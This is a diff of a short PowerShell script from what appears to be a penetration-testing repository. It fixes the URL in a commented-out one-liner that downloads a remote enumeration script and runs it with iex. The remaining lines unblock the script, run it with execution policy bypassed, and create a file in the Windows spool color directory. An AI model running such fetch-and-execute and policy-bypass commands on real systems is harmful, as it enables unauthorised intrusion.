@@ -1,6 +1,6 @@
 #Work in progress!!!
 #Download webenum.ps1
-#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://github.com/h1dz/Pen-Testing/blob/BashScripts/webenum.ps1')"
+#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/webenum.ps1')"
 Unblock-File -Path .\webenum.ps1
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\webenum.ps1
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
